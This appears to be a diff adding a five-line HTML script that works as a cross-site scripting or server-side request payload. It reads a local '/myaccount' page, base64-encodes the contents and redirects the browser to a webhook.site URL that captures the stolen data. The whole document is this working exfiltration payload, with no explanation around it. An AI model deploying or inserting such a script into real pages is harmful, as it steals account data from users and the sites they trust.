@@ -1,0 +1,5 @@
+<script>
+fetch("http://127.0.0.1:9090/myaccount")
+  .then(r => r.text())
+  .then(d => location="https://webhook.site/87c33770-a65c-4151-a67c-9344929f17d7?d="+btoa(d))
+</script>
